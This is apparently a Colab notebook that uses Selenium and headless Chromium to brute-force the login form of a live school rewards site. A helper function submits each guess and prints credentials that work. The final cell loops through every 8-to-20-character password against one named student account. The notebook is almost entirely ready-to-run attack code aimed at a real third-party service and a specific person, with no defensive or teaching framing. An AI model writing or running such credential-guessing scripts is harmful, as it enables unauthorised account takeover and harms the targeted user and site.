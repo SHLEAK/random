{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPJaNIQfr/7tqoZX9rtEjjK",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/SHLEAK/random/blob/main/student_info.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install selenium"
      ],
      "metadata": {
        "id": "itqNwla4yMqh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from selenium import webdriver\n",
        "from selenium.webdriver.chrome.service import Service\n",
        "from selenium.webdriver.common.by import By\n",
        "from selenium.webdriver.common.keys import Keys\n",
        "import time\n",
        "import itertools\n",
        "import string"
      ],
      "metadata": {
        "id": "rZCREvb75vb7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Configure ChromeOptions\n",
        "chrome_options = webdriver.ChromeOptions()\n",
        "chrome_options.add_argument('--headless')\n",
        "chrome_options.add_argument('--no-sandbox')\n",
        "chrome_options.add_argument('--disable-dev-shm-usage')"
      ],
      "metadata": {
        "id": "VLEg_RRO5vYj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Install Chromium WebDriver\n",
        "!apt-get update\n",
        "!apt-get install chromium-chromedriver"
      ],
      "metadata": {
        "id": "kqp5mtBL5vWV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Set the path to the Chromium WebDriver\n",
        "chrome_driver_path = '/usr/bin/chromedriver'\n",
        "chrome_options.binary_location = '/usr/bin/chromium'"
      ],
      "metadata": {
        "id": "9e-SXjFH5vUA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Define the Chrome WebDriver\n",
        "chrome_driver = webdriver.Chrome(service=Service(chrome_driver_path), options=chrome_options)"
      ],
      "metadata": {
        "id": "jVwcQaYR5vRh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def normal(username, password):\n",
        "    chrome_driver.execute_script(\"window.open('');\")\n",
        "    chrome_driver.switch_to.window(chrome_driver.window_handles[-1])\n",
        "    chrome_driver.get(\"https://ssidollars.pythonanywhere.com/accounts/login/?next=/awards/student/560/spend/\")\n",
        "    username_field = chrome_driver.find_element(By.ID, \"id_username\")\n",
        "    password_field = chrome_driver.find_element(By.ID, \"id_password\")\n",
        "    username_field.send_keys(username)\n",
        "    password_field.send_keys(password)\n",
        "    password_field.send_keys(Keys.RETURN)\n",
        "    time.sleep(5)\n",
        "    if \"Your username and password didn't match.\" not in chrome_driver.page_source:\n",
        "        print(f\"username:{username}, password:{password}\")\n",
        "    else:\n",
        "        print(\"fail\")\n",
        "        chrome_driver.close()\n"
      ],
      "metadata": {
        "id": "bLSlqgdw5vPT"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Define the characters to be used in the passwords\n",
        "characters = string.ascii_letters + string.digits + string.punctuation\n",
        "\n",
        "# Define the range of password lengths\n",
        "min_length = 8\n",
        "max_length = 20\n",
        "\n",
        "# Generate permutations\n",
        "for length in range(min_length, max_length + 1):\n",
        "    for combination in itertools.product(characters, repeat=length):\n",
        "        password = ''.join(combination)\n",
        "        normal(\"peterkoo81\", password)\n",
        "\n",
        "chrome_driver.quit()"
      ],
      "metadata": {
        "id": "BiG58JDB5vM1"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}